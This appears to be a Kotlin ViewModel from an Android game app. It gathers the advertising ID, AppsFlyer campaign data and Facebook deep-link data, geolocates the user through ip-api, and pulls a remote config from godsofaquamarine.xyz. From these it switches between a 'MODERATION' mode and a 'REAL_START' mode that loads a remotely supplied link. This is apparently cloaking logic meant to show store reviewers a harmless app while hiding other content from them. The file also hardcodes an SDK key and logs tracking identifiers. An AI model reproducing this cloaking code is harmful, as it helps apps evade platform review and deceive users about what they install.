package com.skgames.traffi

import android.app.Application
import android.content.Context
import android.util.Log
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.orhanobut.hawk.Hawk
import com.skgames.traffi.nev.Constance
import dagger.hilt.android.lifecycle.HiltViewModel
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import javax.inject.Inject

@HiltViewModel
class SortVievModell @Inject constructor(
    private val application: Application
) : ViewModel() {



    private var _currentMode = MutableLiveData<SortClass>()
    val currentMode: LiveData<SortClass>
        get() = _currentMode

    private val _ansvFromGeoService = MutableLiveData<CountryCodeJS?>()
    val ansvFromGeoService: LiveData<CountryCodeJS?>
        get() = _ansvFromGeoService

    private val _ansvFromDevil = MutableLiveData<GeoDev>()
    val ansvFromDevil: LiveData<GeoDev>
        get() = _ansvFromDevil

    private val _advertisingIdClient = MutableLiveData<String>()
    val advertisingIdClient: LiveData<String>
        get() = _advertisingIdClient

    private val _link = MutableLiveData<String>()
    val link: LiveData<String>
        get() = _link

    private val _appsFlyerDattaGotten = MutableLiveData<String>()
    val appsFlyerDattaGotten: LiveData<String>
        get() = _appsFlyerDattaGotten

    private val _appLinkData = MutableLiveData<String>()
    val appLinkData: LiveData<String>
        get() = _appLinkData


    private val appsFlyerConversionListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get(Constance.KEY_CAMPAIGN).toString()

            _appsFlyerDattaGotten.value = dataGotten
            Hawk.put(Constance.KEY_DATA_GOTTEN_APPS, dataGotten)
        }

        override fun onConversionDataFail(p0: String?) {}
        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    fun fetchDeferredAppLinkData() {
        AppLinkData.fetchDeferredAppLinkData(
            application
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {

                val bgbggbg = appLinkData.targetUri.host.toString()
                _appLinkData.value = bgbggbg

                Hawk.put(Constance.KEY_APP_LINK_DATA, bgbggbg)
            }
            if (appLinkData == null) {
            }
        }
    }

    init {


        getAdvertisingIdClient()
    }


    fun makeCheck() {
        val userGeo = ansvFromGeoService.value?.countryCode ?: "noop"

        val listOfAllGeo = ansvFromDevil.value?.geo ?: "none"
        val checker = ansvFromDevil.value?.appsChecker ?: "99"
        val currentLink = ansvFromDevil.value?.view ?: "errorLink"

        val dataGottenApps: String =
            Hawk.get(Constance.KEY_DATA_GOTTEN_APPS, Constance.KEY_NOOOOO_DATA)
        val dataAppLinkData: String =
            Hawk.get(Constance.KEY_APP_LINK_DATA, Constance.KEY_NOOOOO_DATA)
//
//
//
//        if (userGeo == "noop" || listOfAllGeo == "none" || checker == "99" || currentLink == "errorLink") {
//            //repeat getData
//        }

        when (checker) {
            "1" -> {
                makeAppsInit()
                if (
                    dataGottenApps.contains(Constance.KEY_TDB2) || dataAppLinkData.contains(
                        Constance.KEY_TDB2
                    ) || listOfAllGeo.contains(userGeo)
                ) {
                    _currentMode.value = SortClass.REAL_START
                } else {
                    _currentMode.value = SortClass.MODERATION
                }
            }
            "55" -> {
                _currentMode.value = SortClass.TEST_VEB
            }
            else -> {
                _currentMode.value = SortClass.MODERATION
            }
        }

    }

    private fun makeAppsInit() {
        AppsFlyerLib.getInstance()
            .init("EUBo2sR9eDH3fa45JwM2Y7", appsFlyerConversionListener, application)
        AppsFlyerLib.getInstance().start(application)
    }

    suspend fun getDataDev() {
        val apiResponse = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://godsofaquamarine.xyz/")
            .build()
            .create(ServiceApi::class.java)

        if (apiResponse.getDataDev().isSuccessful) {
            val result = apiResponse.getDataDev().body()
            _ansvFromDevil.value = result!!

            val responseVeiv = result.view
            val responseAppsCheker = result.appsChecker
            val responseGeo = result.geo

            Log.d("lolo", "frfrrfgr $responseVeiv")
            Log.d("lolo", "appsCheckerfgtt $responseAppsCheker")
            Log.d("lolo", "retroDatafrffr $responseGeo")

            Hawk.put(Constance.KEY_DEVIL_VIEW, responseVeiv)
            Hawk.put(Constance.KEY_DEVIL_APPS_CHECKER, responseAppsCheker)
            Hawk.put(Constance.KEY_DEVIL_GEO, responseGeo)

        } else {
            Log.d("lolo", "error from host, didn`t recive")
        }
    }

    suspend fun getGeoData() {
        val frgtg = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ServiceApi::class.java)
        val result = frgtg.getData()
        if (result.isSuccessful) {
            val cooode = result.body()
            _ansvFromGeoService.value = cooode

            val codeForHavk = cooode?.countryCode
            Hawk.put(Constance.KEY_GEO_DATA_PRO_IP, codeForHavk)
        }


    }


    private fun getAdvertisingIdClient() {
        val advertisingIdClient = AdvertisingIdClient(application)
        advertisingIdClient.start()
        val idUserAdvertising = advertisingIdClient.info.id ?: Constance.KEY_NULL_ADVERT_USER_ID
        Log.d("lolo", "AdvertisingIdClient $idUserAdvertising")

        _advertisingIdClient.value = idUserAdvertising

        Hawk.put(Constance.KEY_ADVERT_USER_ID, idUserAdvertising)
    }
}